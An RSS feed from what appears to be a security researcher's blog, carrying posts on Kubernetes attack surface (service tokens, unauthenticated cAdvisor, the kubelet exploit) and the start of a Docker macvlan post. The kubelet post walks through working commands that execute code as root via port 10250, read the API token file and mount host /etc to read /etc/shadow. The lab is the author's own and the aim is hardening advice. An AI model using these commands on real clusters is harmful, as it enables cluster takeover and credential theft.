<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title></title>
		<description>Things that occur to me</description>
		<link>/</link>
		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Kubernetes Attack Surface - Service Tokens</title>
				<description>&lt;p&gt;Whilst spending some more time looking at Kubernetes, to help out with the forthcoming CIS Security standard, I was looking at cluster component authentication and noticed something that might not be known by everyone using Kubernetes, so I thought it’d be worth a post.&lt;/p&gt;

&lt;p&gt;When pods are deployed to a cluster, in most default installs, the &lt;a href=&quot;https://kubernetes.io/docs/admin/admission-controllers/&quot;&gt;Admission Contoller&lt;/a&gt; will run and take a set of pre-defined actions before the pods go live.  One of those actions is to mount a &lt;a href=&quot;https://kubernetes.io/docs/admin/service-accounts-admin/&quot;&gt;Service Account&lt;/a&gt; inside the containers that make up the pod.&lt;/p&gt;

&lt;p&gt;This service account includes a token which is mounted at a predictable location &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/run/secrets/kubernetes.io/serviceaccount/token&lt;/code&gt; .&lt;/p&gt;

&lt;p&gt;What’s interesting is that, by default unless &lt;a href=&quot;https://kubernetes.io/docs/admin/authorization/rbac/&quot;&gt;RBAC&lt;/a&gt; is deployed, it’s likely that this token provides cluster admin privileges.&lt;/p&gt;

&lt;p&gt;This means that any attacker with access to a container can, fairly easily, get full access to the cluster API (in fact it’s kind of easier than the &lt;a href=&quot;https://raesene.github.io/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/&quot;&gt;kubelet exploit&lt;/a&gt; ).&lt;/p&gt;

&lt;p&gt;If you want to check this to see if it affects your cluster, just run a pod inside the cluster, attach to one of the containers, get a copy of &lt;a href=&quot;https://storage.googleapis.com/kubernetes-release/release/v1.6.0/bin/linux/amd64/kubectl&quot;&gt;kubectl&lt;/a&gt; and point it at your API Server with something like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./kubectl config set-cluster test --server=https://[API_SERVER_IP]:[API_SERVER_PORT]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;then try out some kubernetes commands…&lt;/p&gt;

&lt;p&gt;Fortunately this issue has been addressed with Kubernetes 1.6 setups which make use of the default RBAC policy, so if you’re concerned about container breakout scenarios, I’d thoroughly recommend upgrading and making sure that you’re using a restrictive RBAC policy.&lt;/p&gt;

&lt;p&gt;So following on from my post about the &lt;a href=&quot;https://raesene.github.io/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/&quot;&gt;kube-exploit&lt;/a&gt;, I thought it would be interesting to look more at the attack surface of my sample Kubernetes cluster from the perspective of a Rogue container.  The setup follows the same path as the last post and I’m running from a kali linux container running on my cluster, to simulate an attacker who has compromised a single container on a cluster.&lt;/p&gt;

&lt;p&gt;So first obvious thing to look at is the network attack surface. Open ports are a first option for an attacker who gets unauthorised access to a system.&lt;/p&gt;

&lt;p&gt;This cluster has three nodes on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.233&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.201&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.232&lt;/code&gt; so we can start with&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sT -n -p- 192.168.41.201,232,233&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;From that, we can see that there are some interesting ports to look at.  The first one I noticed is 4194/TCP.  On the cluster this is used by cAdvisor which provides metrics about your containers and is, by default, available without authentication.&lt;/p&gt;

&lt;p&gt;This provides quite a bit of information about the configuration of the cluster like a process list&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/media/cadvisor_processes.png&quot; alt=&quot;cadvisor process&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and some details on the configuration of the docker daemon on the host&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/media/cadvisor_docker.png&quot; alt=&quot;cadvisor docker&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s also a set of handy API endpoints if you want to dump the information in JSON format.  For example, to get the spec for all the containers running on a host you can just go to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.41.233:4194/api/v2.0/spec?recursive=true&lt;/code&gt; and get output like&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &quot;/docker/0598e0682955545ef27486ce3c04d62b6e1dc15496fb8072c297f2b548e7e10f&quot;: {
        &quot;creation_time&quot;: &quot;2016-10-09T03:55:54.113949226+01:00&quot;,
        &quot;aliases&quot;: [
            &quot;k8s_weave-npc.27539310_weave-net-xf53p_kube-system_af83b2df-8683-11e6-849b-000c29d33879_f938e1de&quot;,
            &quot;0598e0682955545ef27486ce3c04d62b6e1dc15496fb8072c297f2b548e7e10f&quot;
        ],
        &quot;namespace&quot;: &quot;docker&quot;,
        &quot;labels&quot;: {
            &quot;io.kubernetes.container.hash&quot;: &quot;27539310&quot;,
            &quot;io.kubernetes.container.name&quot;: &quot;weave-npc&quot;,
            &quot;io.kubernetes.container.restartCount&quot;: &quot;0&quot;,
            &quot;io.kubernetes.container.terminationMessagePath&quot;: &quot;/dev/termination-log&quot;,
            &quot;io.kubernetes.pod.name&quot;: &quot;weave-net-xf53p&quot;,
            &quot;io.kubernetes.pod.namespace&quot;: &quot;kube-system&quot;,
            &quot;io.kubernetes.pod.terminationGracePeriod&quot;: &quot;30&quot;,
            &quot;io.kubernetes.pod.uid&quot;: &quot;af83b2df-8683-11e6-849b-000c29d33879&quot;
        },
        &quot;has_cpu&quot;: true,
        &quot;cpu&quot;: {
            &quot;limit&quot;: 10,
            &quot;max_limit&quot;: 0,
            &quot;mask&quot;: &quot;0-1&quot;
        },
        &quot;has_memory&quot;: true,
        &quot;memory&quot;: {
            &quot;limit&quot;: 9223372036854771712,
            &quot;reservation&quot;: 9223372036854771712
        },
        &quot;has_custom_metrics&quot;: false,
        &quot;has_network&quot;: false,
        &quot;has_filesystem&quot;: true,
        &quot;has_diskio&quot;: true,
        &quot;image&quot;: &quot;weaveworks/weave-npc:1.7.0&quot;
    },
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This isn’t as serious an issue as the kubelet exploit of course, but still something you’d want to change in your deployment of Kubernetes to harden it.&lt;/p&gt;

&lt;p&gt;After noting this I had a look through the Kubernetes issue list and it looks like this is a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/11710&quot;&gt;known issue&lt;/a&gt; but unfortunately not one with a clear fix for now, so it’d need something like an iptables rule applied to restrict access to it.&lt;/p&gt;

</description>
				<pubDate>Fri, 14 Oct 2016 19:05:39 +0100</pubDate>
				<link>/blog/2016/10/14/Kubernetes-Service-Tokens/</link>
				<guid isPermaLink="true">/blog/2016/10/14/Kubernetes-Service-Tokens/</guid>
			</item>
		
			<item>
				<title>Kubernetes Attack Surface - cAdvisor</title>
				<description>&lt;p&gt;So following on from my post about the &lt;a href=&quot;https://raesene.github.io/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/&quot;&gt;kube-exploit&lt;/a&gt;, I thought it would be interesting to look more at the attack surface of my sample Kubernetes cluster from the perspective of a Rogue container.  The setup follows the same path as the last post and I’m running from a kali linux container running on my cluster, to simulate an attacker who has compromised a single container on a cluster.&lt;/p&gt;

&lt;p&gt;So first obvious thing to look at is the network attack surface. Open ports are a first option for an attacker who gets unauthorised access to a system.&lt;/p&gt;

&lt;p&gt;This cluster has three nodes on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.233&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.201&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.232&lt;/code&gt; so we can start with&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sT -n -p- 192.168.41.201,232,233&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;From that, we can see that there are some interesting ports to look at.  The first one I noticed is 4194/TCP.  On the cluster this is used by cAdvisor which provides metrics about your containers and is, by default, available without authentication.&lt;/p&gt;

&lt;p&gt;This provides quite a bit of information about the configuration of the cluster like a process list&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/media/cadvisor_processes.png&quot; alt=&quot;cadvisor process&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and some details on the configuration of the docker daemon on the host&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/media/cadvisor_docker.png&quot; alt=&quot;cadvisor docker&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s also a set of handy API endpoints if you want to dump the information in JSON format.  For example, to get the spec for all the containers running on a host you can just go to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.41.233:4194/api/v2.0/spec?recursive=true&lt;/code&gt; and get output like&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &quot;/docker/0598e0682955545ef27486ce3c04d62b6e1dc15496fb8072c297f2b548e7e10f&quot;: {
        &quot;creation_time&quot;: &quot;2016-10-09T03:55:54.113949226+01:00&quot;,
        &quot;aliases&quot;: [
            &quot;k8s_weave-npc.27539310_weave-net-xf53p_kube-system_af83b2df-8683-11e6-849b-000c29d33879_f938e1de&quot;,
            &quot;0598e0682955545ef27486ce3c04d62b6e1dc15496fb8072c297f2b548e7e10f&quot;
        ],
        &quot;namespace&quot;: &quot;docker&quot;,
        &quot;labels&quot;: {
            &quot;io.kubernetes.container.hash&quot;: &quot;27539310&quot;,
            &quot;io.kubernetes.container.name&quot;: &quot;weave-npc&quot;,
            &quot;io.kubernetes.container.restartCount&quot;: &quot;0&quot;,
            &quot;io.kubernetes.container.terminationMessagePath&quot;: &quot;/dev/termination-log&quot;,
            &quot;io.kubernetes.pod.name&quot;: &quot;weave-net-xf53p&quot;,
            &quot;io.kubernetes.pod.namespace&quot;: &quot;kube-system&quot;,
            &quot;io.kubernetes.pod.terminationGracePeriod&quot;: &quot;30&quot;,
            &quot;io.kubernetes.pod.uid&quot;: &quot;af83b2df-8683-11e6-849b-000c29d33879&quot;
        },
        &quot;has_cpu&quot;: true,
        &quot;cpu&quot;: {
            &quot;limit&quot;: 10,
            &quot;max_limit&quot;: 0,
            &quot;mask&quot;: &quot;0-1&quot;
        },
        &quot;has_memory&quot;: true,
        &quot;memory&quot;: {
            &quot;limit&quot;: 9223372036854771712,
            &quot;reservation&quot;: 9223372036854771712
        },
        &quot;has_custom_metrics&quot;: false,
        &quot;has_network&quot;: false,
        &quot;has_filesystem&quot;: true,
        &quot;has_diskio&quot;: true,
        &quot;image&quot;: &quot;weaveworks/weave-npc:1.7.0&quot;
    },
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This isn’t as serious an issue as the kubelet exploit of course, but still something you’d want to change in your deployment of Kubernetes to harden it.&lt;/p&gt;

&lt;p&gt;After noting this I had a look through the Kubernetes issue list and it looks like this is a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/11710&quot;&gt;known issue&lt;/a&gt; but unfortunately not one with a clear fix for now, so it’d need something like an iptables rule applied to restrict access to it.&lt;/p&gt;

</description>
				<pubDate>Fri, 14 Oct 2016 19:05:39 +0100</pubDate>
				<link>/blog/2016/10/14/Kubernetes-Attack-Surface-cAdvisor/</link>
				<guid isPermaLink="true">/blog/2016/10/14/Kubernetes-Attack-Surface-cAdvisor/</guid>
			</item>
		
			<item>
				<title>Kubernetes - From Container to Cluster</title>
				<description>&lt;p&gt;I’ve been reading up on Kubernetes a bit recently and &lt;a href=&quot;https://twitter.com/killahertz_&quot;&gt;Jesse Hertz&lt;/a&gt; pointed me at an interesting item around Kubernetes security that illustrates common problem of insecure defaults, so I thought it might be worth a post walking through the issue, mainly as a way for me to improve my Kubernetes knowledge but also could be useful for others who are deploying it.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;td;dr&lt;/strong&gt; if you can get access to the kubelet API port you can control the whole cluster and default configurations of Kubernetes are likely to make this possible, so be careful when setting up your clusters.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;So the issue I wanted to look at is this &lt;a href=&quot;https://github.com/kayrus/kubelet-exploit&quot;&gt;kubelet exploit&lt;/a&gt;.  Basically the kubelet is the service which runs on Kubernetes nodes and manages things like the docker installation on that node amongst other things.  It receives commands from the API server which co-ordinates the actions of the nodes in the cluster.&lt;/p&gt;

&lt;p&gt;The security problem lies in the fact that by default the kubelet service listens on a TCP/IP port with no authentication or authorization control, so anyone who can reach that port at a network level can execute kubelet commands just by issuing HTTP requests to the service.&lt;/p&gt;

&lt;p&gt;This means that an attacker who can get access to that port can basically take over the whole cluster pretty easily.&lt;/p&gt;

&lt;p&gt;The kubernetes team are well aware of this issue but a fix isn’t planned until &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/11816&quot;&gt;Kubernetes 1.5&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;There’s also a workaround mentioned on the kubelet-exploit page which involves binding the kubelet to 127.0.0.1 and then connecting it to the kube-apiserver via SSH tunnels.&lt;/p&gt;

&lt;p&gt;To explore this problem I followed the &lt;a href=&quot;http://kubernetes.io/docs/getting-started-guides/kubeadm/&quot;&gt;kubeadm guide&lt;/a&gt; from the kubernetes site.  Kubeadm is a tool which allows for clusters to be easily set up and appears to somewhat be modeled after some of the docker swarm commands.&lt;/p&gt;

&lt;p&gt;I followed the tutorial through to the point where I had a working cluster, taking all the defaults.&lt;/p&gt;

&lt;p&gt;Then I deployed a container with some tools into the cluster, the scenario we’re testing is that an attacker has gained access to a container in the cluster, and we’ll see what they can do to take control of the cluster with only that access&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl run -i -t badcontainer --image=kalilinux/kali-linux-docker
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;which after a while for the image to download gives us a bash shell running in a container on the cluster.&lt;/p&gt;

&lt;p&gt;So now we can scan round to see whether the port we’re looking for is available.&lt;/p&gt;

&lt;p&gt;First add some tools to our build&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt update
apt install nmap curl
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Then scan the network. In this case my main network where the nodes are installed is 192.168.41.0/24&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -v -n -p10250 192.168.41.0/24
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;from that we get back a bunch of filtered ports but also three open ones which are the IP addresses of my kubernetes nodes.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 192.168.41.201
Host is up (0.00013s latency).
PORT      STATE SERVICE
10250/tcp open  unknown

Nmap scan report for 192.168.41.232
Host is up (0.000065s latency).
PORT      STATE SERVICE
10250/tcp open  unknown

Nmap scan report for 192.168.41.233
Host is up (0.00020s latency).
PORT      STATE SERVICE
10250/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now we can use some of the kubectl commands mentioned in the exploit to start getting more access to the cluster.  First up lets enumerate our containers&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -sk https://192.168.41.233:10250/runningpods/ | python -mjson.tool
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This returns a list of the pods running on the node in JSON form, and also the images they’re based on.  The most interesting one here is&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;metadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;creationTimestamp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-apiserver-kube&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;namespace&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-system&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;uid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0446d05fb9406214210e8d29397f8bf2&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;spec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;containers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gcr.io/google_containers/kube-apiserver-amd64:v1.4.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-apiserver&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;resources&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gcr.io/google_containers/pause-amd64:3.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;resources&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;it’s running the kube-apiserver image, so that’ll be our API server.  As I mentioned earlier the API server is basically the heart of the cluster, so access to it provides a lot of control over the cluster itself.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=ls -la /&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;lists the files in the root directory of that container and if we run&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=whoami&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We get back the answer that every pentester likes to see which is &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; !&lt;/p&gt;

&lt;p&gt;So at this point, that’s pretty bad news for the cluster owner.  A rogue container should not be able to execute privileged commands on the API server of the cluster.&lt;/p&gt;

&lt;p&gt;So the next step in the attack would be to take over the cluster, for which the easiest way is likely to be getting control of the API server, as that lets us create new containers amongst other things.&lt;/p&gt;

&lt;p&gt;if we do&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=ps -ef&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;we can see the process list for the API server which handily provides the path of the token file that Kubernetes uses to authenticate access to the API&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PID   USER     TIME   COMMAND
    1 root       2:29 /usr/local/bin/kube-apiserver --v=4 --insecure-bind-address=127.0.0.1 --etcd-servers=http://127.0.0.1:2379 --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota --service-cluster-ip-range=100.64.0.0/12 --service-account-key-file=/etc/kubernetes/pki/apiserver-key.pem --client-ca-file=/etc/kubernetes/pki/ca.pem --tls-cert-file=/etc/kubernetes/pki/apiserver.pem --tls-private-key-file=/etc/kubernetes/pki/apiserver-key.pem --token-auth-file=/etc/kubernetes/pki/tokens.csv --secure-port=443 --allow-privileged --etcd-servers=http://127.0.0.1:2379
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;here we can see that it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/kubernetes/pki/tokens.csv&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;so then we can just cat out that file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=cat /etc/kubernetes/pki/tokens.csv&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;and we get the token which is the first field listed&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d65ba5f070e714ab,kubeadm-node-csr,9738242e-8681-11e6-b5b4-000c29d33879,system:kubelet-bootstrap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now we can communicate directly with the Kubernetes API like so&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -X GET -H &quot;Authorization: Bearer d65ba5f070e714ab&quot; https://192.168.41.233
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;this gives us easier control of the cluster than we had from just running individual commands on it.&lt;/p&gt;

&lt;p&gt;We could persist with the HTTP API but TBH I find it easier to use kubectl, so we can just download that and point it at our cluster with our newly acquired token.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://storage.googleapis.com/kubernetes-release/release/v1.4.0/bin/linux/amd64/kubectl
chmod +x kubectl
./kubectl config set-cluster test --server=https://192.168.41.233
./kubectl config set-credentials cluster-admin --token=d65ba5f070e714ab
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;From here, the next step it to look at getting access to the underlying nodes.  This can be achieved by mapping in a volume from the node to a container that we run.&lt;/p&gt;

&lt;p&gt;so if we create a file called test-pod.yml&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
kind: Pod
metadata:
  name: test-pd
spec:
  containers:
  - image: nginx
    name: test-container
    volumeMounts:
    - mountPath: /test-pd
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      # directory location on host
      path: /etc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;and start it up with &lt;code class=&quot;highlighter-rouge&quot;&gt;./kubectl create -f test-pod.yml&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;we can then run a command to cat out the /etc/shadow file of the underlying node&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./kubectl exec test-pd -c test-container cat /test-pd/shadow
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;From there it’s just a bit of password cracking needed and we get shell access to the underlying node.&lt;/p&gt;

&lt;p&gt;So from that we can see that there’s definitely something to think about if you’re going to run a Kubernetes cluster in production, i.e. protect access to the kubectl API port…&lt;/p&gt;
</description>
				<pubDate>Sat, 08 Oct 2016 10:05:39 +0100</pubDate>
				<link>/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/</link>
				<guid isPermaLink="true">/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/</guid>
			</item>
		
			<item>
				<title>Docker 1.12 - Macvlan</title>
				<description>&lt;p&gt;Another new cool facet of the 1.12 release of Docker Engine is that Macvlan and Ipvlan support is leaving experimental and is available for all users.  So now instead of the rather convoluted procedure I mentioned &lt;a href=&quot;https://raesene.github.io/blog/2016/02/07/Exploration-in-Docker-bridging/&quot;&gt;last time I looked at this&lt;/a&gt; we can now simplify the setup of containers attached to the same network as the host, removing the need for NAT translation from the container network to the host network.&lt;/p&gt;

&lt;p&gt;An aside first is that it can get a little confusing with Docker’s naming as you may be thinking “hey I already have containers on the docker bridge isn’t that already like being connected to the host network?”.  Well as explained &lt;a href=&quot;http://hicu.be/docker-container-network-types&quot;&gt;here&lt;/a&gt; what docker calls “bridged” is really “NAT” and macvlan is what most people would think of as “bridged”!&lt;/p&gt;

&lt;p&gt;Anyway, the first step in getting a container online directly with the host interface is to create a new macvlan network&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker network create -d macvlan --subnet=192.168.41.0/24 --gateway=192.168.41.1 --ip-range=192.168.41.128/26 -o parent=ens33 testnet
&lt;/code&gt;&lt;/pre&gt;
